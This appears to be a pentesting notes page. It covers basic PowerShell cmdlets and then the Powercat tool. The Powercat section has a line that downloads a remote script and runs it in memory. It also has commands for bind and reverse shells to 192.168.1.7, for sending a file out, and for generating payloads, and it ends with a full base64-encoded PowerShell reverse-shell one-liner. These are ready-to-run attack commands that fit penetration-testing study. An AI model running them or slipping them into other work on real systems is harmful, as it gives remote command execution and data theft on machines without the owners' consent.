# PowerShell & Powercat

### PowerShell&#x20;

#### PowerShell Basic Commands

```powershell
Get-Help <command To neet Help>
```

<figure><img src="../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

{% code title="In Linux Powershell" %}
```powershell
$PSVersionTable
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (239).png" alt=""><figcaption><p>Kali</p></figcaption></figure>

{% code title="In Windows Powershell" %}
```powershell
$PSVersionTable
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (240).png" alt=""><figcaption><p>WIn</p></figcaption></figure>

To get the list of Updates −

* Get-HotFix and to install a hot fix as follows
* Get-HotFix -id kb2741530



### Cmdlet vs Command

Cmdlets are way different from commands in other command-shell environments in the following manners −

* Cmdlets are .NET Framework class objects; and not just stand-alone executables.
* Cmdlets can be easily constructed from as few as a dozen lines of code.
* Parsing, error presentation, and output formatting are not handled by cmdlets. It is done by the Windows PowerShell runtime.
* Cmdlets process works on objects not on text stream and objects can be passed as output for pipelining.
* Cmdlets are record-based as they process a single object at a time.

### Cmdlet

**`New-Item`** cmdlet is used to create a directory by passing the path using -Path as path of the directory and -ItemType as Directory.

```powershell
New-Item -Path '/home/kali/test' -ItemType Directory 
```

<figure><img src="../../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>

```powershell
New-Item -Path '/home/kali/test' -ItemType File
```

**`Copy-Item`** cmdlet is used to copy a directory by passing the path of the directory to be copied and destination path where the folder is to be copied.

```powershell
 Copy-Item 'C:\Users\H3ckt0r\Desktop\Test\test' 'C:\Users\H3ckt0r\Downloads\'
```

**`Remove-Item`** cmdlet is used to delete a directory by passing the path of the directory to be deleted.

```powershell
 Remove-Item  'C:\Users\H3ckt0r\Desktop\Test\test'
```

**`Move-Item`** cmdlet is used to move a directory by passing the path of the directory to be moved and destination path where the folder is to be moved.

```powershell
 Move-Item  'C:\Users\H3ckt0r\Desktop\Test\test'
```

**`Rename-Item`** cmdlet is used to rename a folder by passing the path of the folder to be renamed and target name

```powershell
Rename-Item  'C:\Users\H3ckt0r\Desktop\Test\test'  'C:\Users\H3ckt0r\Desktop\Test\test1'
```

Get-Content cmdlet is used to retrieve content of a file as an array.

```powershell
Get-Content 'T:\Users\H3ckt0r\Downloads\cacert.der'

(Get-Content T:\Users\H3ckt0r\Downloads\cacert.der).length
```

<figure><img src="../../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

**`Test-Path`** cmdlet is used to check existence of a folder.

```powershell
Test-Path /home/kalis/
```

<figure><img src="../../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

### PowerCat

Netcat: The powershell version. (Powershell Version 2 and Later Supported)

```powershell
    IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

```

#### _Parameters_:

```
-l      Listen for a connection.                             [Switch]
-c      Connect to a listener.                               [String]
-p      The port to connect to, or listen on.                [String]
-e      Execute. (GAPING_SECURITY_HOLE)                      [String]
-ep     Execute Powershell.                                  [Switch]
-r      Relay. Format: "-r tcp:10.1.1.1:443"                 [String]
-u      Transfer data over UDP.                              [Switch]
-dns    Transfer data over dns (dnscat2).                    [String]
-dnsft  DNS Failure Threshold.                               [int32]
-t      Timeout option. Default: 60                          [int32]
-i      Input: Filepath (string), byte array, or string.     [object]
-o      Console Output Type: "Host", "Bytes", or "String"    [String]
-of     Output File Path.                                    [String]
-d      Disconnect after connecting.                         [Switch]
-rep    Repeater. Restart after disconnecting.               [Switch]
-g      Generate Payload.                                    [Switch]
-ge     Generate Encoded Payload.                            [Switch]
-h      Print the help message.                              [Switch]
```

### Basic Connections

<pre class="language-powershell"><code class="lang-powershell">Powercat File Transfers:

powercat -c 192.168.1.7 -p 8000 -i C:\Users\limbo\Desktop\file.txt
---------------------------------------------------------------------------------
Powercat Bind Shells:

<strong>powercat -l -p 4444 -e cmd.exe
</strong>---------------------------------------------------------------------------------
Powercat Reverse Shells:

powercat -c 192.168.1.7 -p 4444 -e cmd.exe
---------------------------------------------------------------------------------
Powercat Stand-Alone Payloads:

powercat -c 192.168.1.7 -p 4444 -e cmd.exe -g > reverseshell.ps1
powercat -c 192.168.1.7 -p 4444 -e cmd.exe -ge > encodedreverseshell.ps1
powershell.exe -E JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
---------------------------------------------------------------------------------
</code></pre>
